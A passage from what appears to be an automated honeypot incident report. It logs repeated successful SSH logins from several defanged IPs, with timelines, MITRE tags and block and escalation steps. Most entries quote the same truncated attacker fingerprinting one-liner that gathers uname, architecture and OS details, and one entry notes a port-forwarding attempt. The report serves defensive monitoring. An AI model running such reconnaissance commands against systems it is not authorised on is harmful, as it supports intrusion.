| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:35:16` | `cowrie.session.connect` |
| `2026-07-12 17:35:16` | `cowrie.client.version` |
| `2026-07-12 17:35:17` | `cowrie.client.kex` |
| `2026-07-12 17:35:17` | `cowrie.login.success` |
| `2026-07-12 17:35:18` | `cowrie.session.params` |
| `2026-07-12 17:35:18` | `cowrie.command.input` |
| `2026-07-12 17:35:18` | `cowrie.command.input` |
| `2026-07-12 17:35:18` | `cowrie.command.input` |
| `2026-07-12 17:35:18` | `cowrie.command.input` |
| `2026-07-12 17:35:18` | `cowrie.command.input` |
| `2026-07-12 17:35:18` | `cowrie.command.success` |
| `2026-07-12 17:35:18` | `cowrie.command.input` |
| `2026-07-12 17:35:18` | `cowrie.command.input` |
| `2026-07-12 17:35:18` | `cowrie.command.input` |
| `2026-07-12 17:35:18` | `cowrie.command.input` |
| `2026-07-12 17:35:18` | `cowrie.log.closed` |
| `2026-07-12 17:35:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78c4caaa6698

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 17:35 |
| **Last Seen** | 2026-07-12 17:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:35:52` | `cowrie.session.connect` |
| `2026-07-12 17:35:53` | `cowrie.client.version` |
| `2026-07-12 17:35:53` | `cowrie.client.kex` |
| `2026-07-12 17:35:56` | `cowrie.login.success` |
| `2026-07-12 17:35:57` | `cowrie.session.params` |
| `2026-07-12 17:35:57` | `cowrie.command.input` |
| `2026-07-12 17:35:57` | `cowrie.command.input` |
| `2026-07-12 17:35:57` | `cowrie.command.input` |
| `2026-07-12 17:35:57` | `cowrie.command.input` |
| `2026-07-12 17:35:57` | `cowrie.command.input` |
| `2026-07-12 17:35:57` | `cowrie.command.success` |
| `2026-07-12 17:35:57` | `cowrie.command.input` |
| `2026-07-12 17:35:57` | `cowrie.command.input` |
| `2026-07-12 17:35:57` | `cowrie.command.input` |
| `2026-07-12 17:35:57` | `cowrie.command.input` |
| `2026-07-12 17:35:58` | `cowrie.log.closed` |
| `2026-07-12 17:35:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80638e772a50

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 17:37 |
| **Last Seen** | 2026-07-12 17:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:37:01` | `cowrie.session.connect` |
| `2026-07-12 17:37:01` | `cowrie.client.version` |
| `2026-07-12 17:37:01` | `cowrie.client.kex` |
| `2026-07-12 17:37:02` | `cowrie.login.success` |
| `2026-07-12 17:37:03` | `cowrie.session.params` |
| `2026-07-12 17:37:03` | `cowrie.command.input` |
| `2026-07-12 17:37:03` | `cowrie.command.input` |
| `2026-07-12 17:37:03` | `cowrie.command.input` |
| `2026-07-12 17:37:03` | `cowrie.command.input` |
| `2026-07-12 17:37:03` | `cowrie.command.input` |
| `2026-07-12 17:37:03` | `cowrie.command.success` |
| `2026-07-12 17:37:03` | `cowrie.command.input` |
| `2026-07-12 17:37:03` | `cowrie.command.input` |
| `2026-07-12 17:37:03` | `cowrie.command.input` |
| `2026-07-12 17:37:03` | `cowrie.command.input` |
| `2026-07-12 17:37:04` | `cowrie.log.closed` |
| `2026-07-12 17:37:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d0252b9006d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-12 17:37 |
| **Last Seen** | 2026-07-12 17:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:37:15` | `cowrie.session.connect` |
| `2026-07-12 17:37:16` | `cowrie.client.version` |
| `2026-07-12 17:37:16` | `cowrie.client.kex` |
| `2026-07-12 17:37:18` | `cowrie.login.success` |
| `2026-07-12 17:37:20` | `cowrie.session.params` |
| `2026-07-12 17:37:20` | `cowrie.command.input` |
| `2026-07-12 17:37:20` | `cowrie.command.input` |
| `2026-07-12 17:37:20` | `cowrie.command.input` |
| `2026-07-12 17:37:20` | `cowrie.command.input` |
| `2026-07-12 17:37:20` | `cowrie.command.input` |
| `2026-07-12 17:37:20` | `cowrie.command.success` |
| `2026-07-12 17:37:20` | `cowrie.command.input` |
| `2026-07-12 17:37:20` | `cowrie.command.input` |
| `2026-07-12 17:37:20` | `cowrie.command.input` |
| `2026-07-12 17:37:20` | `cowrie.command.input` |
| `2026-07-12 17:37:20` | `cowrie.log.closed` |
| `2026-07-12 17:37:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0bafc1d39b8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 17:37 |
| **Last Seen** | 2026-07-12 17:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:37:50` | `cowrie.session.connect` |
| `2026-07-12 17:37:52` | `cowrie.client.version` |
| `2026-07-12 17:37:52` | `cowrie.client.kex` |
| `2026-07-12 17:37:56` | `cowrie.login.success` |
| `2026-07-12 17:37:57` | `cowrie.session.params` |
| `2026-07-12 17:37:57` | `cowrie.command.input` |
| `2026-07-12 17:37:57` | `cowrie.command.input` |
| `2026-07-12 17:37:57` | `cowrie.command.input` |
| `2026-07-12 17:37:57` | `cowrie.command.input` |
| `2026-07-12 17:37:57` | `cowrie.command.input` |
| `2026-07-12 17:37:57` | `cowrie.command.success` |
| `2026-07-12 17:37:57` | `cowrie.command.input` |
| `2026-07-12 17:37:57` | `cowrie.command.input` |
| `2026-07-12 17:37:57` | `cowrie.command.input` |
| `2026-07-12 17:37:57` | `cowrie.command.input` |
| `2026-07-12 17:37:57` | `cowrie.log.closed` |
| `2026-07-12 17:37:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dda42912e35a

| Field | Detail |
|---|---|
| **Source IP** | `94.205.250[.]78` |
| **First Seen** | 2026-07-12 17:38 |
| **Last Seen** | 2026-07-12 17:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:38:21` | `cowrie.session.connect` |
| `2026-07-12 17:38:21` | `cowrie.client.version` |
| `2026-07-12 17:38:21` | `cowrie.client.kex` |
| `2026-07-12 17:38:23` | `cowrie.login.success` |
| `2026-07-12 17:38:24` | `cowrie.direct-tcpip.request` |
| `2026-07-12 17:38:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.205.250[.]78` to AbuseIPDB if not already reported
- [ ] Block `94.205.250[.]78` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a50155205631

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 17:39 |
| **Last Seen** | 2026-07-12 17:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:39:11` | `cowrie.session.connect` |
| `2026-07-12 17:39:11` | `cowrie.client.version` |
| `2026-07-12 17:39:11` | `cowrie.client.kex` |
| `2026-07-12 17:39:12` | `cowrie.login.success` |
| `2026-07-12 17:39:13` | `cowrie.session.params` |
| `2026-07-12 17:39:13` | `cowrie.command.input` |
| `2026-07-12 17:39:13` | `cowrie.command.input` |
| `2026-07-12 17:39:13` | `cowrie.command.input` |
| `2026-07-12 17:39:13` | `cowrie.command.input` |
| `2026-07-12 17:39:13` | `cowrie.command.input` |
| `2026-07-12 17:39:13` | `cowrie.command.success` |
| `2026-07-12 17:39:13` | `cowrie.command.input` |
| `2026-07-12 17:39:13` | `cowrie.command.input` |
| `2026-07-12 17:39:13` | `cowrie.command.input` |
| `2026-07-12 17:39:13` | `cowrie.command.input` |
| `2026-07-12 17:39:13` | `cowrie.log.closed` |
| `2026-07-12 17:39:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a7c76e31d3c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-12 17:39 |
| **Last Seen** | 2026-07-12 17:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:39:13` | `cowrie.session.connect` |
| `2026-07-12 17:39:13` | `cowrie.client.version` |
| `2026-07-12 17:39:14` | `cowrie.client.kex` |
| `2026-07-12 17:39:15` | `cowrie.login.success` |
| `2026-07-12 17:39:18` | `cowrie.session.params` |
| `2026-07-12 17:39:18` | `cowrie.command.input` |
| `2026-07-12 17:39:18` | `cowrie.command.input` |
| `2026-07-12 17:39:18` | `cowrie.command.input` |
| `2026-07-12 17:39:18` | `cowrie.command.input` |
| `2026-07-12 17:39:18` | `cowrie.command.input` |
| `2026-07-12 17:39:18` | `cowrie.command.success` |
| `2026-07-12 17:39:18` | `cowrie.command.input` |
| `2026-07-12 17:39:18` | `cowrie.command.input` |
| `2026-07-12 17:39:18` | `cowrie.command.input` |
| `2026-07-12 17:39:18` | `cowrie.command.input` |
| `2026-07-12 17:39:19` | `cowrie.log.closed` |
| `2026-07-12 17:39:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-626b4389d10b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 17:39 |
| **Last Seen** | 2026-07-12 17:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:39:38` | `cowrie.session.connect` |
| `2026-07-12 17:39:39` | `cowrie.client.version` |
| `2026-07-12 17:39:39` | `cowrie.client.kex` |
| `2026-07-12 17:39:42` | `cowrie.login.success` |
| `2026-07-12 17:39:43` | `cowrie.session.params` |
| `2026-07-12 17:39:43` | `cowrie.command.input` |
| `2026-07-12 17:39:43` | `cowrie.command.input` |
| `2026-07-12 17:39:43` | `cowrie.command.input` |
| `2026-07-12 17:39:43` | `cowrie.command.input` |
| `2026-07-12 17:39:43` | `cowrie.command.input` |
| `2026-07-12 17:39:43` | `cowrie.command.success` |
| `2026-07-12 17:39:43` | `cowrie.command.input` |
| `2026-07-12 17:39:43` | `cowrie.command.input` |
| `2026-07-12 17:39:43` | `cowrie.command.input` |
| `2026-07-12 17:39:43` | `cowrie.command.input` |
| `2026-07-12 17:39:44` | `cowrie.log.closed` |
| `2026-07-12 17:39:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27e85dc33324

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-12 17:41 |
| **Last Seen** | 2026-07-12 17:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:41:11` | `cowrie.session.connect` |
| `2026-07-12 17:41:11` | `cowrie.client.version` |
| `2026-07-12 17:41:11` | `cowrie.client.kex` |
| `2026-07-12 17:41:12` | `cowrie.login.success` |
| `2026-07-12 17:41:14` | `cowrie.session.params` |
| `2026-07-12 17:41:14` | `cowrie.command.input` |
| `2026-07-12 17:41:14` | `cowrie.command.input` |
| `2026-07-12 17:41:14` | `cowrie.command.input` |
| `2026-07-12 17:41:14` | `cowrie.command.input` |
| `2026-07-12 17:41:14` | `cowrie.command.input` |
| `2026-07-12 17:41:14` | `cowrie.command.success` |
| `2026-07-12 17:41:14` | `cowrie.command.input` |
| `2026-07-12 17:41:14` | `cowrie.command.input` |
| `2026-07-12 17:41:14` | `cowrie.command.input` |
| `2026-07-12 17:41:14` | `cowrie.command.input` |
| `2026-07-12 17:41:15` | `cowrie.log.closed` |
| `2026-07-12 17:41:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f49d1539fe73

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 17:41 |
| **Last Seen** | 2026-07-12 17:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:41:20` | `cowrie.session.connect` |
| `2026-07-12 17:41:20` | `cowrie.client.version` |
| `2026-07-12 17:41:20` | `cowrie.client.kex` |
| `2026-07-12 17:41:21` | `cowrie.login.success` |
| `2026-07-12 17:41:23` | `cowrie.session.params` |
| `2026-07-12 17:41:23` | `cowrie.command.input` |
| `2026-07-12 17:41:23` | `cowrie.command.input` |
| `2026-07-12 17:41:23` | `cowrie.command.input` |
| `2026-07-12 17:41:23` | `cowrie.command.input` |
| `2026-07-12 17:41:23` | `cowrie.command.input` |
| `2026-07-12 17:41:23` | `cowrie.command.success` |
| `2026-07-12 17:41:23` | `cowrie.command.input` |
| `2026-07-12 17:41:23` | `cowrie.command.input` |
| `2026-07-12 17:41:23` | `cowrie.command.input` |
| `2026-07-12 17:41:23` | `cowrie.command.input` |
| `2026-07-12 17:41:23` | `cowrie.log.closed` |
| `2026-07-12 17:41:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-925bf67ddbb8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 17:41 |
| **Last Seen** | 2026-07-12 17:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:41:31` | `cowrie.session.connect` |
| `2026-07-12 17:41:32` | `cowrie.client.version` |
| `2026-07-12 17:41:32` | `cowrie.client.kex` |
| `2026-07-12 17:41:37` | `cowrie.login.success` |
| `2026-07-12 17:41:38` | `cowrie.session.params` |
| `2026-07-12 17:41:38` | `cowrie.command.input` |
| `2026-07-12 17:41:38` | `cowrie.command.input` |
| `2026-07-12 17:41:38` | `cowrie.command.input` |
| `2026-07-12 17:41:38` | `cowrie.command.input` |
| `2026-07-12 17:41:38` | `cowrie.command.input` |
| `2026-07-12 17:41:38` | `cowrie.command.success` |
| `2026-07-12 17:41:38` | `cowrie.command.input` |
| `2026-07-12 17:41:38` | `cowrie.command.input` |
| `2026-07-12 17:41:38` | `cowrie.command.input` |
| `2026-07-12 17:41:38` | `cowrie.command.input` |
| `2026-07-12 17:41:38` | `cowrie.log.closed` |
| `2026-07-12 17:41:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bd5ec8c04b4

| Field | Detail |
|---|---|
| **Source IP** | `47.77.216[.]159` |
| **First Seen** | 2026-07-12 17:42 |
| **Last Seen** | 2026-07-12 17:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:42:26` | `cowrie.session.connect` |
| `2026-07-12 17:42:26` | `cowrie.client.version` |
| `2026-07-12 17:42:26` | `cowrie.client.kex` |
| `2026-07-12 17:42:26` | `cowrie.login.success` |
| `2026-07-12 17:42:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.77.216[.]159` to AbuseIPDB if not already reported
- [ ] Block `47.77.216[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ffdd4c36f48

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-12 17:42 |
| **Last Seen** | 2026-07-12 17:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:42:26` | `cowrie.session.connect` |
| `2026-07-12 17:42:26` | `cowrie.client.version` |
| `2026-07-12 17:42:26` | `cowrie.client.kex` |
| `2026-07-12 17:42:26` | `cowrie.login.success` |
| `2026-07-12 17:42:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67d44f54c189

